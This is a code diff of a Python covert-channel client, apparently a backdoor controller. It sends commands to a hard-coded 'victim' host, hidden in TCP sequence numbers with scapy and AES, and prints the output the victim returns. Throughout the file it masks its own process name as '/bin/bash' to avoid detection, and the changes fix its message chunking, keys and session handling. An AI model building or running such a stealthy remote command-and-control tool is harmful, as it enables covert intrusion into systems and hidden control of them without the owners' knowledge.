@@ -6,7 +6,7 @@ import os
 import subprocess
 import sys
 import time
-import bkutil
+from bkutil import message_to_bits
 from multiprocessing import Process
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -20,10 +20,10 @@ Setup: pip3 install pycrypto setproctitle scapy
     
 TTL=234
 # random secret key (both the client and server must match this key)
-encryptionKey = "passyourwords"
+encryptionKey = "passyourwordssss"
 iv = Random.new().read(AES.block_size)
-IV = "whatsthedealwithairplanes"
-victim=("192.168.0.8",99)
+IV = "whatsthedealwith"
+victim=("192.168.0.6",9999)
 messages = []
 authentication ="1337"
 
@@ -37,15 +37,9 @@ def secret_send(msg:str, type:str='command'):
     '''
     if(type == "command"):
         #Convert message to ASCII to bits
-        msg = bkutil.message_to_bits(msg)
-    elif(type == "file"):
-        #Convert the message to bits
-        msg = bkutil.file_to_bits(msg)
-        #split msg into pieces that will fit in the packets
-        message_array = message_spliter(msg)
-        #send packets
-        packets = packatizer(message_array) #TODO 
-
+        msg = message_to_bits(msg)
+        chunks = message_spliter(msg)
+        packets = packatizer(chunks)
         if(len(packets) == 1):
             send(packets[0])
         else:
@@ -59,8 +53,6 @@ def message_spliter(msg:str):
         output = []
         output.append(msg)
         return msg
-    #However, if its less than the max amount that can be carried by the packet/
-    #protocol, then pad it to reach the max length.
     elif(len(msg) <= length):
         # Pad so that the message is as long as the length
         msg = msg.zfill(length)
@@ -69,7 +61,7 @@ def message_spliter(msg:str):
     #then break it down into multiple chunks
     elif(len(msg) > length):
         #Rounds are the amount of packets that can be filled with the data.
-        rounds = len(msg) / length
+        rounds = int(len(msg) / length)
         #The excess is what will be left over
         excess = len(msg) % length
         #Create the blank array that will hold the data for each packet.
@@ -97,7 +89,7 @@ def packatizer(msg):
     counter = 0
     #Create a UID to put in every packet, so that we know what session the
     #Packets are part of
-    UID = generateUID()
+    UID = str(uuid.uuid1())
 
     #If not an array (if there is only one packet.)
     if(type(msg) is str):
@@ -112,17 +104,11 @@ def packatizer(msg):
             # i.e. 1/3 messages to send.
             packets.append(craft(msg[counter],counter+1,len(msg),UID))
             counter = counter + 1
-
     return packets
 
-def generateUID():
-    uid = uuid.uuid1()
-    return str(uid)
-
-def craft(data,position,total,UID):
+def craft(data:str,position:int,total:int,UID:str) -> IP:
     global TTL
     global authentication
-
     #The payload contains the unique password, UID, position number and total.
     packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1],dport=victim[1], \
         seq=int(str(data),2))/Raw(load=encrypt(authentication+"\n"+UID+"\n"+str(position)+":" \
@@ -156,11 +142,8 @@ def client():
             sys.exit()
         else:
             #Encrypt the command.
-            encryptedCommand = encrypt(command)
-            # Specify to the sendMessage funciton that we are sending on the
-            # protocol as defined in the config file, the command & what type of
-            # transmission it will be ( a command )
-            secret_send(encryptedCommand)
+            #encryptedCommand = encrypt(command)
+            secret_send(command)
             # Immediately after sending, start listening for responses.
             # The time-out has been set to 10 seconds so as to allow enough time
             # for responses to large commands (i.e. iptables -L ) to return.
@@ -172,7 +155,7 @@ def handle(packet):
         # Don't handle any inbound packets that are looping back.
         if(packet[IP].src != myip[0]):
             #Authenticate the packet based on the pre-defined characteristics.
-            if authenticate(packet):
+            if(authenticate(packet)):
                 #Decrypt the payload and split on the newline characters
                 payload = decrypt(packet["Raw"].load).split("\n")
                 UID = payload[1]
@@ -180,9 +163,7 @@ def handle(packet):
                 total = payload[2].split(":")[1]
                 #Handle packet based on TCP rules
                 if(packet.haslayer(TCP)):
-                    #Define the length
                     length = 32
-                    # DECRYPT THE COVERT CONTENTS?!?!?!
                     # Convert to binary
                     field = packet[TCP].seq
                     #Converts the bits to the nearest divisible by 8
@@ -205,9 +186,6 @@ def handle(packet):
                         print ("OUTPUT: \n " + decryptedMessage)
                         #Delete the packets belonging to the session from memory
                         deleteMessages(UID)
-
-def sniffFile():
-    sniff(filter="ip and dst port 90", prn=receiveFile)
 
 def lengthChecker(field):
     covertContent = 0
@@ -247,6 +225,4 @@ def authenticate(packet):
 setproctitle.setproctitle("/bin/bash") #set fake process name
 #print(setproctitle.getproctitle())
 
-fileProcess = Process(target=sniffFile)
-fileProcess.start()
 client()
